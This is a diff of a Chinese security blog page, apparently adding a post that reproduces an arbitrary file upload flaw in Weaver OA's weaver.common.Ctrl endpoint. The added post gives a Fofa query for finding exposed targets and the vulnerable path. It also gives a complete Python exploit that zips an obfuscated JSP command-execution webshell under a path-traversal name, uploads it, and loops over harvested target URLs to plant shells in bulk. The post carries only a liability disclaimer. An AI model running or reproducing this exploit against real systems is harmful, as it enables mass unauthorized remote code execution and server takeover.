@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="images, Qs">
+    <meta name="keywords" content="泛微OA weaver.common.Ctrl 任意文件上传漏洞复现, Qs">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>images | Qs</title>
+    <title>泛微OA weaver.common.Ctrl 任意文件上传漏洞复现 | Qs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -323,12 +323,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/source/images/%E6%B3%9B%E5%BE%AEOA%20weaver.common.Ctrl%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">images</h1>
+                    <h1 class="description center-align post-title">泛微OA weaver.common.Ctrl 任意文件上传漏洞复现</h1>
                 </div>
             </div>
         </div>
@@ -442,12 +442,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%B3%9B%E5%BE%AEOA-weaver-common-Ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">泛微OA weaver.common.Ctrl 任意文件上传漏洞复现</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -465,7 +478,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    570
                 </div>
                 
 
@@ -482,7 +495,15 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="泛微OA-weaver-common-Ctrl-存在任意文件上传漏洞复现"><a href="#泛微OA-weaver-common-Ctrl-存在任意文件上传漏洞复现" class="headerlink" title="泛微OA weaver.common.Ctrl 存在任意文件上传漏洞复现"></a>泛微OA weaver.common.Ctrl 存在任意文件上传漏洞复现</h2><p><strong>使用需知</strong><br>由于传播和使用本文所提供的任何直接或间接的后果和损失，均由用户承担，作者对此不承担任何责任。如果文章出现敏感内容产生不良影响,请联系作者删除。</p>
+<p><strong>Fofa</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app&#x3D;&quot;泛微-协同办公OA&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>漏洞路径</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;weaver&#x2F;weaver.common.Ctrl&#x2F;.css?arg0&#x3D;com.cloudstore.api.service.Service_CheckApp&amp;arg1&#x3D;validateApp</span><br></pre></td></tr></table></figure>
+
+<p>![avatar](./泛微OA weaver.common.Ctrl 任意文件上传漏洞复现_1.png)</p>
+<p><strong>POC</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import random</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def generate_random_str(randomlength&#x3D;16):</span><br><span class="line">    random_str &#x3D; &#39;&#39;</span><br><span class="line">    base_str &#x3D; &#39;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#39;</span><br><span class="line">    length &#x3D; len(base_str) - 1</span><br><span class="line">    for i in range(randomlength):</span><br><span class="line">        random_str +&#x3D; base_str[random.randint(0, length)]</span><br><span class="line">        return random_str</span><br><span class="line">mm &#x3D; generate_random_str(8)</span><br><span class="line"></span><br><span class="line">webshell_name1 &#x3D; mm+&#39;.jsp&#39;</span><br><span class="line">webshell_name2 &#x3D; &#39;..&#x2F;..&#x2F;..&#x2F;&#39;+webshell_name1</span><br><span class="line"></span><br><span class="line">def file_zip():</span><br><span class="line">    shell &#x3D; &quot;&quot;&quot;&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;sun.misc.BASE64Decoder&quot; %&gt; </span><br><span class="line">&lt;% </span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!&#x3D;null)&#123; </span><br><span class="line">        BASE64Decoder decoder &#x3D; new BASE64Decoder();</span><br><span class="line">        Class rt &#x3D; Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU&#x3D;&quot;)));</span><br><span class="line">        Process e &#x3D; (Process)</span><br><span class="line">            rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw&#x3D;&#x3D;&quot;)), String.class).invoke(rt.getMethod(new String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ&#x3D;&#x3D;&quot;))).invoke(null, new Object[]&#123;&#125;), request.getParameter(&quot;cmd&quot;) ); </span><br><span class="line">            java.io.InputStream in &#x3D; e.getInputStream();</span><br><span class="line">            int a &#x3D; -1;</span><br><span class="line">            byte[] b &#x3D; new byte[2048];</span><br><span class="line">            out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">            while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">                out.println(new String(b)); </span><br><span class="line">            &#125;</span><br><span class="line">            out.print(&quot;&lt;&#x2F;pre&gt;&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">%&gt; &quot;&quot;&quot;</span><br><span class="line">    zf &#x3D; zipfile.ZipFile(mm+&#39;.zip&#39;, mode&#x3D;&#39;w&#39;, compression&#x3D;zipfile.ZIP_DEFLATED)</span><br><span class="line">    zf.writestr(webshell_name2, shell)</span><br><span class="line"></span><br><span class="line">def GetShell(urllist):</span><br><span class="line">    file_zip()</span><br><span class="line">    print(&#39;上传文件中&#39;)</span><br><span class="line">    urls &#x3D; urllist + &#39;&#x2F;weaver&#x2F;weaver.common.Ctrl&#x2F;.css?arg0&#x3D;com.cloudstore.api.service.Service_CheckApp&amp;arg1&#x3D;validateApp&#39;</span><br><span class="line">    file &#x3D; [(&#39;file1&#39;, (mm+&#39;.zip&#39;, open(mm + &#39;.zip&#39;, &#39;rb&#39;), &#39;application&#x2F;zip&#39;))]</span><br><span class="line">    requests.post(url&#x3D;urls,files&#x3D;file,timeout&#x3D;60, verify&#x3D;False)</span><br><span class="line">    GetShellurl &#x3D; urllist+&#39;&#x2F;cloudstore&#x2F;&#39;+webshell_name1</span><br><span class="line">    GetShelllist &#x3D; requests.get(url &#x3D; GetShellurl)</span><br><span class="line">    if GetShelllist.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print(&#39;利用成功webshell地址为:&#39;+GetShellurl)</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;未找到webshell利用失败&#39;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # if (len(sys.argv) &#x3D;&#x3D; 2):</span><br><span class="line">        #  url &#x3D; sys.argv[1] # GetShell(url) # else:</span><br><span class="line">        #  print(&quot;python3 poc.py http:&#x2F;&#x2F;xx.xx.xx.xx&quot;)</span><br><span class="line">    with open(&quot;fofa_result.txt&quot;, &quot;r+&quot;) as f:  # fofa_result.txt自己从fofa上获得的目标网站</span><br><span class="line">        list_urls &#x3D; f.readlines()</span><br><span class="line">        for url in list_urls:</span><br><span class="line">            try:</span><br><span class="line">                GetShell(url.strip())</span><br><span class="line">            except Exception as e:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
                 
             </div>
             <hr/>
@@ -508,7 +529,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://lqsblog.cn/images/index.html">http://lqsblog.cn/images/index.html</a>
+                    <a href="http://lqsblog.cn/posts/14280.html">http://lqsblog.cn/posts/14280.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -545,7 +566,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E6%B3%9B%E5%BE%AEOA-weaver-common-Ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">泛微OA weaver.common.Ctrl 任意文件上传漏洞复现</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -720,13 +745,12 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/images/index.html">
+                <a href="/posts/14280.html">
                     <div class="card-image">
                         
+                        <img src="/source/images/%E6%B3%9B%E5%BE%AEOA%20weaver.common.Ctrl%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_1.jpg" class="responsive-img" alt="泛微OA weaver.common.Ctrl 任意文件上传漏洞复现">
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="images">
-                        
-                        <span class="card-title">images</span>
+                        <span class="card-title">泛微OA weaver.common.Ctrl 任意文件上传漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -741,13 +765,25 @@
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Qs
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B3%9B%E5%BE%AEOA-weaver-common-Ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">泛微OA weaver.common.Ctrl 任意文件上传漏洞复现</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -755,16 +791,16 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/images/index.html">
+                <a href="/posts/11574.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="images">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="PHP">
                         
-                        <span class="card-title">images</span>
+                        <span class="card-title">PHP</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -775,17 +811,28 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-16
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Qs
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%90%8E%E7%AB%AF/" class="post-category">
+                                    后端
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
